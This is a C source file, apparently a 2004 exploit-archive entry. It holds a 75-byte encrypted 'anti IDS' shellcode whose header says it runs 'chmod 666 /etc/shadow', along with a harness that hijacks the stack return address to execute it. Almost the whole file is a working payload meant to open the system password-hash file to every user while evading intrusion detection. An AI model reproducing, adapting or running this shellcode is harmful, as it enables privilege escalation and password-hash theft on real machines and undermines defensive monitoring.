/*
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
 *
 * s0t4ipv6@shellcode.com.ar
 * 0x17abril0x7d2
 *
 * !!!!! ENCRIPTADA !!!!!

 * 75 bytes
 * chmod 666 /etc/shadow

 * !!!!! ENCRIPTADA !!!!!
 *
 * Para mas informacion
 * Descargue http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz
 *
 * !!!!!! ANTI IDS SHELLCODE !!!!!!
*/

#include <stdio.h>

char shellcode[]=
"\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x29\x59\x49\x5b\x8a\x04\x0f"
"\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8"
"\xe0\xff\xff\xff\x03\xb6\x90\x07\xbe\x39\xba\x79\x6c\x87\x20"
"\xf0\x48\xcf\x0e\x8f\x40\x3d\xb2\x4e\x0e\x7f\x72\xb2\x97\xf3"
"\xe4\xff\xff\x2f\xb5\xee\xe8\xb3\xa3\xe4\xf6\xfa\xf4\xe7\xdb";

void main() {
        int *ret;
        ret = (int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) =(int)shellcode;
}

// milw0rm.com [2004-09-26]